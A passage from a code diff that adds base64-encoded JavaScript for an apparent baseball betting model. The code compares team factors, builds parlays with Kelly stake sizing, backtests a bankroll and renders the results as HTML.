+`aXhlZCgzKSxiVmFsOmJXLnRvRml4ZWQoMyksZGVsdGE6KGFXLWJXKSo0LjJ9`,
+`LHtsYWJlbDonVGVhbSBTTEcnLGFWYWw6QS5oaXQuc2xnLnRvRml4ZWQoMyks`,
+`YlZhbDpCLmhpdC5zbGcudG9GaXhlZCgzKSxkZWx0YTooQS5oaXQuc2xnLUIu`,
+`aGl0LnNsZykqMC44fSx7bGFiZWw6J0JBQklQIGx1Y2snLGFWYWw6QS5oaXQu`,
+`YmFiaXAudG9GaXhlZCgzKSxiVmFsOkIuaGl0LmJhYmlwLnRvRml4ZWQoMyks`,
+`ZGVsdGE6LShhTC1iTCl9LHtsYWJlbDonSG9tZSBGaWVsZCcsYVZhbDonQXdh`,
+`eScsYlZhbDonSG9tZScsZGVsdGE6LTAuMTZ9LHtsYWJlbDonUGFyayBGYWN0`,
+`b3InLGFWYWw6JycrKFBBUktbQS5uYW1lXXx8MTAwKSxiVmFsOihQQVJLW0Iu`,
+`bmFtZV18fDEwMCkrJyBob21lJyxkZWx0YTooKFBBUktbQi5uYW1lXXx8MTAw`,
+`KS0xMDApKjAuMDA0fSx7bGFiZWw6J1NlYXNvbiBXaW4gUGN0JyxhVmFsOigo`,
+`QS5zdGFuZC5wY3QqMTAwMCl8MCkvMTArJyUnLGJWYWw6KChCLnN0YW5kLnBj`,
+`dCoxMDAwKXwwKS8xMCsnJScsZGVsdGE6KEEuc3RhbmQucGN0LUIuc3RhbmQu`,
+`cGN0KSowLjMwfSx7bGFiZWw6J1JlY2VudCBMMTAnLGFWYWw6TWF0aC5yb3Vu`,
+`ZChBLnJlY2VudC53aW5QY3QqMTApKyctJytNYXRoLnJvdW5kKCgxLUEucmVj`,
+`ZW50LndpblBjdCkqMTApLGJWYWw6TWF0aC5yb3VuZChCLnJlY2VudC53aW5Q`,
+`Y3QqMTApKyctJytNYXRoLnJvdW5kKCgxLUIucmVjZW50LndpblBjdCkqMTAp`,
+`LGRlbHRhOihBLnJlY2VudC53aW5QY3QtQi5yZWNlbnQud2luUGN0KSowLjUw`,
+`fSx7bGFiZWw6J1J1biBEaWZmJyxhVmFsOihBLnN0YW5kLnJkaWZmPj0wPycr`,
+`JzonJykrQS5zdGFuZC5yZGlmZixiVmFsOihCLnN0YW5kLnJkaWZmPj0wPycr`,
+`JzonJykrQi5zdGFuZC5yZGlmZixkZWx0YTooQS5zdGFuZC5yZGlmZi1CLnN0`,
+`YW5kLnJkaWZmKSowLjAwNX1dO2lmKGgyaCYmaDJoLnRvdGFsPj0zKWZhY3Rv`,
+`cnMucHVzaCh7bGFiZWw6J0gySCcsYVZhbDpoMmguYXdheVdpbnMrJy0nKyho`,
+`MmgudG90YWwtaDJoLmF3YXlXaW5zKSsnIGF3YXknLGJWYWw6KGgyaC50b3Rh`,
+`bC1oMmguYXdheVdpbnMpKyctJytoMmguYXdheVdpbnMrJyBob21lJyxkZWx0`,
+`YTooaDJoLmF3YXlQY3QtMC41KSowLjIwfSk7ZmFjdG9ycy5zb3J0KGZ1bmN0`,
+`aW9uKHgseSl7cmV0dXJuIE1hdGguYWJzKHkuZGVsdGEpLU1hdGguYWJzKHgu`,
+`ZGVsdGEpO30pO3JldHVybntwY3RBOk1hdGgucm91bmQocEEqMTAwKSxwY3RC`,
+`Ok1hdGgucm91bmQocEIqMTAwKSxtbEE6bWwocEEpLG1sQjptbChwQiksb3U6`,
+`KHJBK3JCKzAuNSkudG9GaXhlZCgxKSxjb25maWRlbmNlOk1hdGguYWJzKHBB`,
+`LTAuNSk+MC4xNT8nSGlnaCc6TWF0aC5hYnMocEEtMC41KT4wLjA3PydNZWRp`,
+`dW0nOidMb3cnLHdpbm5lcjp3aW5uZXIsd2lubmVyUDpwQT49cEI/cEE6cEIs`,
+`d2lubmVyTUw6cEE+PXBCP21sKHBBKTptbChwQikscHJvalNjb3JlOnBBPj1w`,
+`Qj8oTWF0aC5tYXgockEsckIpKyctJytNYXRoLm1pbihyQSxyQikpOihNYXRo`,
+`Lm1pbihyQSxyQikrJy0nK01hdGgubWF4KHJBLHJCKSksZmFjdG9yczpmYWN0`,
+`b3JzLGFOYW1lOkEubmFtZSxiTmFtZTpCLm5hbWUsYVBpdGNoZXI6QS5waXRj`,
+`aGVyTmFtZSxiUGl0Y2hlcjpCLnBpdGNoZXJOYW1lLGFCbGVuZDpBLnBpdGNo`,
+`LGJCbGVuZDpCLnBpdGNoLHBhcmtCOlBBUktbQi5uYW1lXXx8MTAwLGgyaDpo`,
+`Mmh9O30KZnVuY3Rpb24gYnVpbGRQYXJsYXlzKHJlc3VsdHMsYm9va09kZHMs`,
+`bWluRWRnZVBjdCl7Ym9va09kZHM9Ym9va09kZHN8fHt9O3ZhciBtaW5FPSht`,
+`aW5FZGdlUGN0fHwyKS8xMDA7dmFyIGVkZ3k9cmVzdWx0cy5maWx0ZXIoZnVu`,
+`Y3Rpb24ocil7cmV0dXJuIHIud2lubmVyUD49MC41NDt9KS5tYXAoZnVuY3Rp`,
+`b24ocil7dmFyIGJtbD1ib29rT2Rkc1tyLmdhbWVQa118fG51bGw7dmFyIGU9`,
+`Ym1sP2VkZ2VDYWxjKHIud2lubmVyUCxibWwpOm51bGw7dmFyIGhhc0VkZ2U9`,
+`ZSE9PW51bGw/ZT49bWluRTp0cnVlO3ZhciBlbWw9Ym1sfHxyLndpbm5lck1M`,
+`O3JldHVybiBPYmplY3QuYXNzaWduKHt9LHIse2Jvb2tNTDpibWwsZWRnZVBj`,
+`dDplLGhhc0VkZ2U6aGFzRWRnZSxlZmZlY3RpdmVNTDplbWwsa2VsbHlQY3Q6`,
+`a2VsbHkoci53aW5uZXJQLGVtbCkqMTAwfSk7fSkuZmlsdGVyKGZ1bmN0aW9u`,
+`KHIpe3JldHVybiByLmhhc0VkZ2U7fSkuc29ydChmdW5jdGlvbihhLGIpe3Zh`,
+`ciBlYT1hLmVkZ2VQY3QhPT1udWxsP2EuZWRnZVBjdDpNYXRoLmFicyhhLndp`,
+`bm5lclAtMC41KSowLjI7dmFyIGViPWIuZWRnZVBjdCE9PW51bGw/Yi5lZGdl`,
+`UGN0Ok1hdGguYWJzKGIud2lubmVyUC0wLjUpKjAuMjtyZXR1cm4gZWItZWE7`,
+`fSk7dmFyIHNpbmdsZXM9ZWRneS5zbGljZSgwLDMpLm1hcChmdW5jdGlvbihy`,
+`KXtyZXR1cm57bGVnczpbcl0sdHlwZTonU2luZ2xlJyxjb21iaW5lZFA6ci53`,
+`aW5uZXJQLHBheW91dDptbERlYyhyLmVmZmVjdGl2ZU1MKSxrZWxseVBjdDpy`,
+`LmtlbGx5UGN0LGNvbWJpbmVkRWRnZTpyLmVkZ2VQY3R9O30pO3ZhciB0b3A0`,
+`PWVkZ3kuc2xpY2UoMCw0KSxwYXJsYXlzMj1bXTtmb3IodmFyIGk9MDtpPHRv`,
+`cDQubGVuZ3RoO2krKylmb3IodmFyIGo9aSsxO2o8dG9wNC5sZW5ndGg7aisr`,
+`KXt2YXIgYT10b3A0W2ldLGI9dG9wNFtqXTtpZihhLmdhbWVQaz09PWIuZ2Ft`,
+`ZVBrKWNvbnRpbnVlO3ZhciBjcD1hLndpbm5lclAqYi53aW5uZXJQLHBwPW1s`,
+`RGVjKGEuZWZmZWN0aXZlTUwpKm1sRGVjKGIuZWZmZWN0aXZlTUwpO3ZhciBj`,
+`ZT0oYS5lZGdlUGN0IT09bnVsbCYmYi5lZGdlUGN0IT09bnVsbCk/KGEuZWRn`,
+`ZVBjdCtiLmVkZ2VQY3QpLzI6bnVsbDtwYXJsYXlzMi5wdXNoKHtsZWdzOlth`,
+`LGJdLHR5cGU6JzItTGVnIFBhcmxheScsY29tYmluZWRQOmNwLHBheW91dDpw`,
+`cCxrZWxseVBjdDprZWxseShjcCwnKycrTWF0aC5yb3VuZCgocHAtMSkqMTAw`,
+`KSkqMTAwLGNvbWJpbmVkRWRnZTpjZX0pO31wYXJsYXlzMi5zb3J0KGZ1bmN0`,
+`aW9uKGEsYil7cmV0dXJuKGIuY29tYmluZWRFZGdlIT09bnVsbD9iLmNvbWJp`,
+`bmVkRWRnZTpiLmNvbWJpbmVkUCktKGEuY29tYmluZWRFZGdlIT09bnVsbD9h`,
+`LmNvbWJpbmVkRWRnZTphLmNvbWJpbmVkUCk7fSk7dmFyIHBhcmxheXMzPVtd`,
+`LHRvcDM9ZWRneS5zbGljZSgwLDMpO2lmKHRvcDMubGVuZ3RoPT09MyYmdG9w`,
+`M1swXS5nYW1lUGshPT10b3AzWzFdLmdhbWVQayYmdG9wM1sxXS5nYW1lUGsh`,
+`PT10b3AzWzJdLmdhbWVQayYmdG9wM1swXS5nYW1lUGshPT10b3AzWzJdLmdh`,
+`bWVQayl7dmFyIGNwMz10b3AzWzBdLndpbm5lclAqdG9wM1sxXS53aW5uZXJQ`,
+`KnRvcDNbMl0ud2lubmVyUDt2YXIgcHAzPW1sRGVjKHRvcDNbMF0uZWZmZWN0`,
+`aXZlTUwpKm1sRGVjKHRvcDNbMV0uZWZmZWN0aXZlTUwpKm1sRGVjKHRvcDNb`,
+`Ml0uZWZmZWN0aXZlTUwpO3ZhciBjZTM9KHRvcDNbMF0uZWRnZVBjdCE9PW51`,
+`bGwmJnRvcDNbMV0uZWRnZVBjdCE9PW51bGwmJnRvcDNbMl0uZWRnZVBjdCE9`,
+`PW51bGwpPyh0b3AzWzBdLmVkZ2VQY3QrdG9wM1sxXS5lZGdlUGN0K3RvcDNb`,
+`Ml0uZWRnZVBjdCkvMzpudWxsO3BhcmxheXMzLnB1c2goe2xlZ3M6dG9wMyx0`,
+`eXBlOiczLUxlZyBQYXJsYXknLGNvbWJpbmVkUDpjcDMscGF5b3V0OnBwMyxr`,
+`ZWxseVBjdDprZWxseShjcDMsJysnK01hdGgucm91bmQoKHBwMy0xKSoxMDAp`,
+`KSoxMDAsY29tYmluZWRFZGdlOmNlM30pO31yZXR1cm57c2luZ2xlczpzaW5n`,
+`bGVzLHBhcmxheXMyOnBhcmxheXMyLnNsaWNlKDAsMikscGFybGF5czM6cGFy`,
+`bGF5czMsZWRnZUZpbHRlcmVkOmVkZ3kubGVuZ3RofTt9CmZ1bmN0aW9uIGNv`,
+`bXB1dGVCYWNrdGVzdChyZXN1bHRzLGJhbmtyb2xsKXtmdW5jdGlvbiByZWMo`,
+`YXJyKXtpZighYXJyLmxlbmd0aClyZXR1cm57dzowLGw6MCxwY3Q6bnVsbH07`,
+`dmFyIHc9YXJyLmZpbHRlcihmdW5jdGlvbihyKXtyZXR1cm4gci5jb3JyZWN0`,
+`O30pLmxlbmd0aDtyZXR1cm57dzp3LGw6YXJyLmxlbmd0aC13LHBjdDoody9h`,
+`cnIubGVuZ3RoKjEwMCkudG9GaXhlZCgxKX07fXZhciBicz1iYW5rcm9sbCxw`,
+`ZWFrPWJhbmtyb2xsLG1heEREPTA7cmVzdWx0cy5mb3JFYWNoKGZ1bmN0aW9u`,
+`KHIpe3ZhciBrPWtlbGx5KHIud2lubmVyUCxyLndpbm5lck1MKSpiczt2YXIg`,
+`Zz1yLmNvcnJlY3Q/ayoobWxEZWMoci53aW5uZXJNTCktMSk6LWs7YnM9TWF0`,
+`aC5tYXgoMSxicytnKTtwZWFrPU1hdGgubWF4KHBlYWssYnMpO21heEREPU1h`,
+`dGgubWF4KG1heERELChwZWFrLWJzKS9wZWFrKjEwMCk7fSk7dmFyIGJ1Y2tl`,
+`dHM9W3tsYWJlbDonNTQtNTglJyxsbzowLjU0LGhpOjAuNTh9LHtsYWJlbDon`,
+`NTgtNjIlJyxsbzowLjU4LGhpOjAuNjJ9LHtsYWJlbDonNjItNjYlJyxsbzow`,
+`LjYyLGhpOjAuNjZ9LHtsYWJlbDonNjYtNzAlJyxsbzowLjY2LGhpOjAuNzB9`,
+`LHtsYWJlbDonNzAlKycsbG86MC43MCxoaToxLjAwfV0ubWFwKGZ1bmN0aW9u`,
+`KGIpe3ZhciBncz1yZXN1bHRzLmZpbHRlcihmdW5jdGlvbihyKXtyZXR1cm4g`,
+`ci53aW5uZXJQPj1iLmxvJiZyLndpbm5lclA8Yi5oaTt9KTt2YXIgd2lucz1n`,
+`cy5maWx0ZXIoZnVuY3Rpb24ocil7cmV0dXJuIHIuY29ycmVjdDt9KS5sZW5n`,
+`dGg7cmV0dXJue2xhYmVsOmIubGFiZWwsbG86Yi5sbyxoaTpiLmhpLGdhbWVz`,
+`OmdzLmxlbmd0aCx3aW5zOndpbnMsYWN0dWFsUGN0OmdzLmxlbmd0aD8od2lu`,
+`cy9ncy5sZW5ndGgqMTAwKS50b0ZpeGVkKDEpOm51bGx9O30pO3ZhciBieURh`,
+`dGU9e307cmVzdWx0cy5mb3JFYWNoKGZ1bmN0aW9uKHIpe2lmKCFieURhdGVb`,
+`ci5kYXRlXSlieURhdGVbci5kYXRlXT1bXTtieURhdGVbci5kYXRlXS5wdXNo`,
+`KHIpO30pO3ZhciBwMWI9YmFua3JvbGwscDJiPWJhbmtyb2xsLHAzYj1iYW5r`,
+`cm9sbCxwYXJsYXlEYXlzPVtdO09iamVjdC5rZXlzKGJ5RGF0ZSkuc29ydCgp`,
+`LmZvckVhY2goZnVuY3Rpb24oZGF0ZSl7dmFyIHBsYXlzO3RyeXtwbGF5cz1i`,
+`dWlsZFBhcmxheXMoYnlEYXRlW2RhdGVdKTt9Y2F0Y2goZSl7cGxheXM9e3Np`,
+`bmdsZXM6W10scGFybGF5czI6W10scGFybGF5czM6W119O312YXIgcz1wbGF5`,
+`cy5zaW5nbGVzWzBdLHAyPXBsYXlzLnBhcmxheXMyWzBdLHAzPXBsYXlzLnBh`,
+`cmxheXMzWzBdO2lmKHMpe3ZhciBrPWtlbGx5KHMuY29tYmluZWRQLHMubGVn`,
+`c1swXS53aW5uZXJNTCkqcDFiO3AxYj1NYXRoLm1heCgxLHAxYisocy5sZWdz`,
+`WzBdLmNvcnJlY3Q/ayoobWxEZWMocy5sZWdzWzBdLndpbm5lck1MKS0xKTot`,
+`aykpO31pZihwMil7dmFyIG9kPXAyLmxlZ3MucmVkdWNlKGZ1bmN0aW9uKGEs`,
+`bCl7cmV0dXJuIGEqbWxEZWMobC53aW5uZXJNTCk7fSwxKTt2YXIgazI9a2Vs`,
+`bHkocDIuY29tYmluZWRQLCcrJytNYXRoLnJvdW5kKChvZC0xKSoxMDApKSpw`,
+`MmI7cDJiPU1hdGgubWF4KDEscDJiKyhwMi5sZWdzLmV2ZXJ5KGZ1bmN0aW9u`,
+`KGwpe3JldHVybiBsLmNvcnJlY3Q7fSk/azIqKG9kLTEpOi1rMikpO31pZihw`,
+`Myl7dmFyIG9kMz1wMy5sZWdzLnJlZHVjZShmdW5jdGlvbihhLGwpe3JldHVy`,
+`biBhKm1sRGVjKGwud2lubmVyTUwpO30sMSk7dmFyIGszPWtlbGx5KHAzLmNv`,
+`bWJpbmVkUCwnKycrTWF0aC5yb3VuZCgob2QzLTEpKjEwMCkpKnAzYjtwM2I9`,
+`TWF0aC5tYXgoMSxwM2IrKHAzLmxlZ3MuZXZlcnkoZnVuY3Rpb24obCl7cmV0`,
+`dXJuIGwuY29ycmVjdDt9KT9rMyoob2QzLTEpOi1rMykpO31wYXJsYXlEYXlz`,
+`LnB1c2goe2RhdGU6ZGF0ZSxzaW5nbGU6cz97aGl0OnMubGVnc1swXS5jb3Jy`,
+`ZWN0LGxhYmVsOnMubGVnc1swXS53aW5uZXJ9Om51bGwscGFybGF5MjpwMj97`,
+`aGl0OnAyLmxlZ3MuZXZlcnkoZnVuY3Rpb24obCl7cmV0dXJuIGwuY29ycmVj`,
+`dDt9KSxsYWJlbDpwMi5sZWdzLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC53`,
+`aW5uZXI7fSkuam9pbignICsgJyl9Om51bGwscGFybGF5MzpwMz97aGl0OnAz`,
+`LmxlZ3MuZXZlcnkoZnVuY3Rpb24obCl7cmV0dXJuIGwuY29ycmVjdDt9KSxs`,
+`YWJlbDpwMy5sZWdzLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC53aW5uZXI7`,
+`fSkuam9pbignICsgJyl9Om51bGx9KTt9KTtmdW5jdGlvbiBwUmVjKGRheXMs`,
+`a2V5KXt2YXIgcGw9ZGF5cy5maWx0ZXIoZnVuY3Rpb24oZCl7cmV0dXJuIGRb`,
+`a2V5XTt9KTt2YXIgd289cGwuZmlsdGVyKGZ1bmN0aW9uKGQpe3JldHVybiBk`,
+`W2tleV0uaGl0O30pO3JldHVybnt3OndvLmxlbmd0aCxsOnBsLmxlbmd0aC13`,
+`by5sZW5ndGgscGN0OnBsLmxlbmd0aD8od28ubGVuZ3RoL3BsLmxlbmd0aCox`,
+`MDApLnRvRml4ZWQoMSk6bnVsbH07fXJldHVybnthbGw6cmVjKHJlc3VsdHMp`,
+`LGhpZ2g6cmVjKHJlc3VsdHMuZmlsdGVyKGZ1bmN0aW9uKHIpe3JldHVybiBy`,
+`LmNvbmZpZGVuY2U9PT0nSGlnaCc7fSkpLG1lZGl1bTpyZWMocmVzdWx0cy5m`,
+`aWx0ZXIoZnVuY3Rpb24ocil7cmV0dXJuIHIuY29uZmlkZW5jZT09PSdNZWRp`,
+`dW0nO30pKSxsb3c6cmVjKHJlc3VsdHMuZmlsdGVyKGZ1bmN0aW9uKHIpe3Jl`,
+`dHVybiByLmNvbmZpZGVuY2U9PT0nTG93Jzt9KSkscm9pOigoYnMtYmFua3Jv`,
+`bGwpL2Jhbmtyb2xsKjEwMCkudG9GaXhlZCgxKSxmaW5hbEJhbms6YnMudG9G`,
+`aXhlZCgwKSxjYWxpYnJhdGlvbjpidWNrZXRzLGJldHM6cmVzdWx0cyxwYXJs`,
+`YXlEYXlzOnBhcmxheURheXMscDFSZWNvcmQ6cFJlYyhwYXJsYXlEYXlzLCdz`,
+`aW5nbGUnKSxwMlJlY29yZDpwUmVjKHBhcmxheURheXMsJ3BhcmxheTInKSxw`,
+`M1JlY29yZDpwUmVjKHBhcmxheURheXMsJ3BhcmxheTMnKSxwMVJvaTooKHAx`,
+`Yi1iYW5rcm9sbCkvYmFua3JvbGwqMTAwKS50b0ZpeGVkKDEpLHAyUm9pOigo`,
+`cDJiLWJhbmtyb2xsKS9iYW5rcm9sbCoxMDApLnRvRml4ZWQoMSkscDNSb2k6`,
+`KChwM2ItYmFua3JvbGwpL2Jhbmtyb2xsKjEwMCkudG9GaXhlZCgxKX07fQpm`,
+`dW5jdGlvbiBhbmFseXplR2FtZShnYW1lLGRhdGUpe3ZhciB5cj1kYXRlLnNs`,
+`aWNlKDAsNCk7cmV0dXJuIFByb21pc2UuYWxsKFtmZXRjaFNQKGdhbWUuYXdh`,
+`eS5waXRjaGVySWQseXIpLGZldGNoU1AoZ2FtZS5ob21lLnBpdGNoZXJJZCx5`,
+`ciksZmV0Y2hIaXQoZ2FtZS5hd2F5LmlkLHlyKSxmZXRjaEhpdChnYW1lLmhv`,
+`bWUuaWQseXIpLGZldGNoUGl0KGdhbWUuYXdheS5pZCx5ciksZmV0Y2hQaXQo`,
+`Z2FtZS5ob21lLmlkLHlyKSxmZXRjaERlZihnYW1lLmF3YXkuaWQseXIpLGZl`,
+`dGNoRGVmKGdhbWUuaG9tZS5pZCx5ciksZmV0Y2hSZWNlbnQoZ2FtZS5hd2F5`,
+`LmlkLGRhdGUpLGZldGNoUmVjZW50KGdhbWUuaG9tZS5pZCxkYXRlKSxmZXRj`,
+`aFN0YW5kKGdhbWUuYXdheS5pZCx5ciksZmV0Y2hTdGFuZChnYW1lLmhvbWUu`,
+`aWQseXIpLGZldGNoSDJIKGdhbWUuYXdheS5pZCxnYW1lLmhvbWUuaWQseXIp`,
+`XSkudGhlbihmdW5jdGlvbihyKXt2YXIgQT17bmFtZTpnYW1lLmF3YXkubmFt`,
+`ZSxwaXRjaGVyTmFtZTpnYW1lLmF3YXkucGl0Y2hlck5hbWUscGl0Y2g6Ymxl`,
+`bmRQaXRjaChyWzBdLHJbNF0pLGhpdDpyWzJdfHxBVkdfSElULGRlZjpyWzZd`,
+`fHxBVkdfREVGLHJlY2VudDpyWzhdfHx7d2luUGN0OjAuNTAwfSxzdGFuZDpy`,
+`WzEwXXx8QVZHX1NUQU5EfTt2YXIgQj17bmFtZTpnYW1lLmhvbWUubmFtZSxw`,
+`aXRjaGVyTmFtZTpnYW1lLmhvbWUucGl0Y2hlck5hbWUscGl0Y2g6YmxlbmRQ`,
+`aXRjaChyWzFdLHJbNV0pLGhpdDpyWzNdfHxBVkdfSElULGRlZjpyWzddfHxB`,
+`VkdfREVGLHJlY2VudDpyWzldfHx7d2luUGN0OjAuNTAwfSxzdGFuZDpyWzEx`,
+`XXx8QVZHX1NUQU5EfTtyZXR1cm4gT2JqZWN0LmFzc2lnbih7fSxydW5Nb2Rl`,
+`bChBLEIsclsxMl0pLHt3ZWF0aGVyOmdhbWUud2VhdGhlcix2ZW51ZTpnYW1l`,
+`LnZlbnVlLHRpbWU6Z2FtZS50aW1lLGdhbWVQazpnYW1lLmdhbWVQa30pO30p`,
+`O30KZnVuY3Rpb24gYW5hbHl6ZUdhbWVDYWNoZWQoZ2FtZSx5cil7cmV0dXJu`,
+`IFByb21pc2UuYWxsKFtmZXRjaFNQKGdhbWUuYXdheS5waXRjaGVySWQseXIp`,
+`LmNhdGNoKGZ1bmN0aW9uKCl7cmV0dXJuIG51bGw7fSksZmV0Y2hTUChnYW1l`,
+`LmhvbWUucGl0Y2hlcklkLHlyKS5jYXRjaChmdW5jdGlvbigpe3JldHVybiBu`,
+`dWxsO30pLGNhY2hlZFN0YXRzKGdhbWUuYXdheS5pZCx5ciksY2FjaGVkU3Rh`,
+`dHMoZ2FtZS5ob21lLmlkLHlyKSxmZXRjaFJlY2VudChnYW1lLmF3YXkuaWQs`,
+`Z2FtZS5kYXRlKS5jYXRjaChmdW5jdGlvbigpe3JldHVybnt3aW5QY3Q6MC41`,
+`MDB9O30pLGZldGNoUmVjZW50KGdhbWUuaG9tZS5pZCxnYW1lLmRhdGUpLmNh`,
+`dGNoKGZ1bmN0aW9uKCl7cmV0dXJue3dpblBjdDowLjUwMH07fSksZmV0Y2hI`,
+`MkgoZ2FtZS5hd2F5LmlkLGdhbWUuaG9tZS5pZCx5cikuY2F0Y2goZnVuY3Rp`,
+`b24oKXtyZXR1cm4gbnVsbDt9KV0pLnRoZW4oZnVuY3Rpb24ocil7dmFyIGNz`,
+`QT1yWzJdfHx7aGl0OkFWR19ISVQscGl0Om51bGwsZGVmOkFWR19ERUYsc3Rh`,
+`bmQ6QVZHX1NUQU5EfTt2YXIgY3NCPXJbM118fHtoaXQ6QVZHX0hJVCxwaXQ6`,
+`bnVsbCxkZWY6QVZHX0RFRixzdGFuZDpBVkdfU1RBTkR9O3ZhciBBPXtuYW1l`,
+`OmdhbWUuYXdheS5uYW1lLHBpdGNoZXJOYW1lOmdhbWUuYXdheS5waXRjaGVy`,
+`TmFtZSxwaXRjaDpibGVuZFBpdGNoKHJbMF0sY3NBLnBpdCksaGl0OmNzQS5o`,
+`aXQsZGVmOmNzQS5kZWYscmVjZW50OnJbNF18fHt3aW5QY3Q6MC41MDB9LHN0`,
+`YW5kOmNzQS5zdGFuZHx8QVZHX1NUQU5EfTt2YXIgQj17bmFtZTpnYW1lLmhv`,
+`bWUubmFtZSxwaXRjaGVyTmFtZTpnYW1lLmhvbWUucGl0Y2hlck5hbWUscGl0`,
+`Y2g6YmxlbmRQaXRjaChyWzFdLGNzQi5waXQpLGhpdDpjc0IuaGl0LGRlZjpj`,
+`c0IuZGVmLHJlY2VudDpyWzVdfHx7d2luUGN0OjAuNTAwfSxzdGFuZDpjc0Iu`,
+`c3RhbmR8fEFWR19TVEFORH07dmFyIHJlcz1ydW5Nb2RlbChBLEIscls2XSk7`,
+`cmV0dXJuIE9iamVjdC5hc3NpZ24oe30scmVzLHtkYXRlOmdhbWUuZGF0ZSxh`,
+`Y3R1YWxXaW5uZXI6Z2FtZS5hY3R1YWxXaW5uZXIsY29ycmVjdDpyZXMud2lu`,
+`bmVyPT09Z2FtZS5hY3R1YWxXaW5uZXJ9KTt9KTt9CmZ1bmN0aW9uIGxvYWRU`,
+`cmFkZXMoKXt0cnl7cmV0dXJuIEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdl`,
+`dEl0ZW0oJ2RtLXRyYWRlcycpfHwnW10nKTt9Y2F0Y2goZSl7cmV0dXJuW107`,
+`fX0KZnVuY3Rpb24gc2F2ZVRyYWRlcyh0KXt0cnl7bG9jYWxTdG9yYWdlLnNl`,
+`dEl0ZW0oJ2RtLXRyYWRlcycsSlNPTi5zdHJpbmdpZnkodCkpO31jYXRjaChl`,
+`KXt9fQpmdW5jdGlvbiBjb25mQ29sKGMpe3JldHVybiBjPT09J0hpZ2gnPycj`,
+`Yzg5MjJhJzpjPT09J01lZGl1bSc/JyM4YThhM2EnOicjNmE1YTNhJzt9CmZ1`,
+`bmN0aW9uIGVkZ2VCYWRnZShlKXtpZihlPT09bnVsbHx8ZT09PXVuZGVmaW5l`,
+`ZClyZXR1cm4nJzt2YXIgY29sPWU+PTAuMDU/JyM1YWJhOGEnOmU+PTAuMDI/`,
+`JyM4YWJhNWEnOicjYzBjMDYwJztyZXR1cm4nPHNwYW4gc3R5bGU9ImZvbnQt`,
+`c2l6ZToxMXB4O2ZvbnQtd2VpZ2h0OjkwMDtmb250LWZhbWlseTptb25vc3Bh`,
+`Y2U7Y29sb3I6Jytjb2wrJztiYWNrZ3JvdW5kOnJnYmEoOTAsMTg2LDEzOCww`,
+`LjA4KTtib3JkZXI6MXB4IHNvbGlkICMyYTRhMmE7Ym9yZGVyLXJhZGl1czo0`,
+`cHg7cGFkZGluZzoycHggNnB4Ij4nKyhlPj0wPycrJzonJykrKGUqMTAwKS50`,
+`b0ZpeGVkKDEpKyclIEVER0U8L3NwYW4+Jzt9CmZ1bmN0aW9uIHdpbkJhcihw`,
+`QSxwQil7cmV0dXJuJzxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtoZWlnaHQ6`,
+`MzJweDtib3JkZXItcmFkaXVzOjRweDtvdmVyZmxvdzpoaWRkZW47Ym9yZGVy`,
+`OjFweCBzb2xpZCAjMjUyMDE1O21hcmdpbi10b3A6NnB4Ij48ZGl2IHN0eWxl`,
+`PSJ3aWR0aDonK3BBKyclO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDkw`,
+`ZGVnLCNiMDc4MjAsI2Q0YTAzMCk7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1z`,
+`OmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2ZvbnQtc2l6ZToxM3B4`,
+`O2ZvbnQtd2VpZ2h0OjkwMDtjb2xvcjojMWExMDAwO2ZvbnQtZmFtaWx5Om1v`,
+`bm9zcGFjZSI+JytwQSsnJTwvZGl2PjxkaXYgc3R5bGU9IndpZHRoOicrcEIr`,
+`JyU7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoOTBkZWcsIzJhNTA3MCwj`,
+`M2E2YTlhKTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3Rp`,
+`ZnktY29udGVudDpjZW50ZXI7Zm9udC1zaXplOjEzcHg7Zm9udC13ZWlnaHQ6`,
+`OTAwO2NvbG9yOiNjMGQ4ZjA7Zm9udC1mYW1pbHk6bW9ub3NwYWNlIj4nK3BC`,
+`KyclPC9kaXY+PC9kaXY+Jzt9CmZ1bmN0aW9uIGZhY3RvclJvdyhmKXt2YXIg`,
+`ZmF2QT1mLmRlbHRhPjAuMDA1LGZhdkI9Zi5kZWx0YTwtMC4wMDU7dmFyIHBj`,
+`dD1NYXRoLnJvdW5kKE1hdGgubWluKE1hdGguYWJzKGYuZGVsdGEpLzAuNDAs`,
+`MSkqMTAwKTt2YXIgY29sPWZhdkE/JyNjODkyMmEnOmZhdkI/JyMzYTZhOWEn`,
+`OicjNDQ0Jzt2YXIgYmFyU3R5bGU9ZmF2Qj8ncmlnaHQ6MCc6J2xlZnQ6MCc7`,
+`cmV0dXJuJzxkaXYgc3R5bGU9InBhZGRpbmc6N3B4IDA7Ym9yZGVyLWJvdHRv`,
+`bToxcHggc29saWQgIzJlMjQxNiI+PGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4`,
+`O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO21hcmdpbi1ib3R0b206`,
+`M3B4O2ZsZXgtd3JhcDp3cmFwO2dhcDozcHgiPjxzcGFuIHN0eWxlPSJmb250`,
+`LXNpemU6MTFweDtjb2xvcjojNmE1YTNhIj4nK2YubGFiZWwrJzwvc3Bhbj48`,
+`c3Bhbj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7Zm9udC1mYW1pbHk6`,
+`bW9ub3NwYWNlO2NvbG9yOicrKGZhdkE/JyNlMGIwNDAnOicjNTU1JykrJyI+`,
+`JytmLmFWYWwrJzwvc3Bhbj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7`,
+`Y29sb3I6IzJlMjQxNiI+IHZzIDwvc3Bhbj48c3BhbiBzdHlsZT0iZm9udC1z`,
+`aXplOjExcHg7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2NvbG9yOicrKGZhdkI/`,
+`JyM3YWFiZGYnOicjNTU1JykrJyI+JytmLmJWYWwrJzwvc3Bhbj48L3NwYW4+`,
+`PC9kaXY+PGRpdiBzdHlsZT0iaGVpZ2h0OjNweDtiYWNrZ3JvdW5kOiMyZTI0`,
+`MTY7Ym9yZGVyLXJhZGl1czoycHg7cG9zaXRpb246cmVsYXRpdmUiPjxkaXYg`,
